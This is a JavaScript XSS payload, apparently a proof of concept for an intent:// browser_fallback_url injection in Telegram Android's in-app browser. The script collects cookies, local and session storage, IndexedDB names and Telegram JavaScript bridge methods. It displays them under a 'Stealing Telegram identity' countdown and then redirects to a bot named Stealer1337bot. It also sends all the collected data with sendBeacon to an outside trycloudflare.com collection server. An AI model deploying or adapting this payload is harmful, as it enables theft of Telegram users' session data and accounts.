// XSS Proof - Telegram Android intent:// vulnerability
// Fires in Telegram's in-app browser WebView

// Collect everything accessible
var data = {};
data.cookies = document.cookie || '(none)';
data.origin = window.origin;
data.domain = document.domain;
data.url = location.href;
data.protocol = location.protocol;
data.referrer = document.referrer;
data.ua = navigator.userAgent;

// localStorage
data.ls = {};
try {
  for (var i = 0; i < localStorage.length; i++) {
    var k = localStorage.key(i);
    data.ls[k] = localStorage.getItem(k);
  }
} catch(e) { data.ls = '(blocked)'; }

// sessionStorage
data.ss = {};
try {
  for (var i = 0; i < sessionStorage.length; i++) {
    var k = sessionStorage.key(i);
    data.ss[k] = sessionStorage.getItem(k);
  }
} catch(e) { data.ss = '(blocked)'; }

// Telegram JS bridges
data.bridges = {};
var names = ['TelegramWebviewProxy','TelegramGameProxy','TelegramWebview','__tg__','Telegram','Android','app','native'];
for (var j = 0; j < names.length; j++) {
  try {
    if (window[names[j]]) {
      data.bridges[names[j]] = typeof window[names[j]];
      var methods = [];
      for (var prop in window[names[j]]) methods.push(prop);
      if (methods.length) data.bridges[names[j] + '_methods'] = methods.join(', ');
    }
  } catch(e) {}
}

// IndexedDB
try {
  if (indexedDB.databases) {
    indexedDB.databases().then(function(dbs) {
      data.idb = dbs.map(function(db) { return db.name + ' v' + db.version; });
    }).catch(function(){});
  }
} catch(e) {}

function esc(s) {
  var d = document.createElement('div');
  d.textContent = s || '';
  return d.innerHTML;
}

// Build XSS proof display immediately
var lsKeys = typeof data.ls === 'object' ? Object.keys(data.ls) : [];
var ssKeys = typeof data.ss === 'object' ? Object.keys(data.ss) : [];
var bridgeKeys = Object.keys(data.bridges);

var lsHtml = '';
if (lsKeys.length > 0) {
  for (var i = 0; i < lsKeys.length; i++) {
    lsHtml += '<div class="row"><span class="label">' + esc(lsKeys[i]) + '</span><span class="val hl">' + esc(String(data.ls[lsKeys[i]]).substring(0, 150)) + '</span></div>';
  }
} else { lsHtml = '<div class="row"><span class="val dim">(empty)</span></div>'; }

var ssHtml = '';
if (ssKeys.length > 0) {
  for (var i = 0; i < ssKeys.length; i++) {
    ssHtml += '<div class="row"><span class="label">' + esc(ssKeys[i]) + '</span><span class="val hl">' + esc(String(data.ss[ssKeys[i]]).substring(0, 150)) + '</span></div>';
  }
} else { ssHtml = '<div class="row"><span class="val dim">(empty)</span></div>'; }

var brHtml = '';
if (bridgeKeys.length > 0) {
  for (var i = 0; i < bridgeKeys.length; i++) {
    var v = data.bridges[bridgeKeys[i]];
    brHtml += '<div class="row"><span class="label">' + esc(bridgeKeys[i]) + '</span><span class="val red">' + esc(String(v)) + '</span></div>';
  }
} else { brHtml = '<div class="row"><span class="val dim">(none detected)</span></div>'; }

document.open();
document.write('<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1.0">'
  + '<style>'
  + '*{margin:0;padding:0;box-sizing:border-box}'
  + 'body{background:#0d1117;color:#c9d1d9;font-family:ui-monospace,"Courier New",monospace;font-size:12px;padding:16px}'
  + '.hdr{text-align:center;padding:16px 0 12px;border-bottom:2px solid #ff0040}'
  + '.hdr h1{color:#ff0040;font-size:22px;letter-spacing:3px;text-shadow:0 0 30px rgba(255,0,64,0.6)}'
  + '.hdr p{color:#f85149;font-size:11px;margin-top:4px}'
  + '.hdr .vuln{color:#6e7681;font-size:10px;margin-top:2px}'
  + '.sec{margin-top:14px}'
  + '.sec-t{color:#58a6ff;font-size:13px;font-weight:bold;margin-bottom:6px;padding-bottom:3px;border-bottom:1px solid #21262d}'
  + '.row{display:flex;gap:6px;padding:3px 0;word-break:break-all}'
  + '.label{color:#8b949e;min-width:90px;flex-shrink:0}'
  + '.val{color:#7ee787}'
  + '.val.hl{color:#ffa657}'
  + '.val.red{color:#ff7b72;font-weight:bold}'
  + '.val.dim{color:#484f58;font-style:italic}'
  + '.cd{text-align:center;color:#ff0040;margin-top:18px;font-size:13px;padding:10px;border:1px solid #30363d;border-radius:6px;background:#161b22}'
  + '</style></head><body>'

  + '<div class="hdr">'
  + '<h1>XSS CONFIRMED</h1>'
  + '<p>Telegram Android In-App Browser</p>'
  + '<p class="vuln">CVE: intent:// URI browser_fallback_url injection</p>'
  + '</div>'

  + '<div class="sec"><div class="sec-t">EXECUTION CONTEXT</div>'
  + '<div class="row"><span class="label">Origin:</span><span class="val">' + esc(data.origin) + '</span></div>'
  + '<div class="row"><span class="label">Domain:</span><span class="val">' + esc(data.domain) + '</span></div>'
  + '<div class="row"><span class="label">Protocol:</span><span class="val">' + esc(data.protocol) + '</span></div>'
  + '</div>'

  + '<div class="sec"><div class="sec-t">COOKIES (document.cookie)</div>'
  + '<div class="row"><span class="val hl">' + esc(data.cookies) + '</span></div>'
  + '</div>'

  + '<div class="sec"><div class="sec-t">LOCAL STORAGE (' + lsKeys.length + ' keys)</div>' + lsHtml + '</div>'
  + '<div class="sec"><div class="sec-t">SESSION STORAGE (' + ssKeys.length + ' keys)</div>' + ssHtml + '</div>'

  + '<div class="sec"><div class="sec-t">TELEGRAM JS BRIDGES</div>' + brHtml + '</div>'

  + '<div class="sec"><div class="sec-t">USER AGENT</div>'
  + '<div class="row" style="font-size:10px"><span class="val">' + esc(data.ua) + '</span></div>'
  + '</div>'

  + '<div class="cd" id="cd">Stealing Telegram identity in 6s...</div>'

  + '</body></html>');
document.close();

// Countdown then chain
var sec = 6;
var timer = setInterval(function() {
  sec--;
  var el = document.getElementById('cd');
  if (el) el.textContent = 'Stealing Telegram identity in ' + sec + 's...';
  if (sec <= 0) {
    clearInterval(timer);
    location.href = 'tg://resolve?domain=Stealer1337bot&start=auto&startapp=x';
  }
}, 1000);

// Send XSS data to collection server
try {
  navigator.sendBeacon('https://brings-popularity-elsewhere-libraries.trycloudflare.com/collect/xss', JSON.stringify({
    type: 'xss',
    data: data,
    ts: Date.now()
  }));
} catch(e) {}
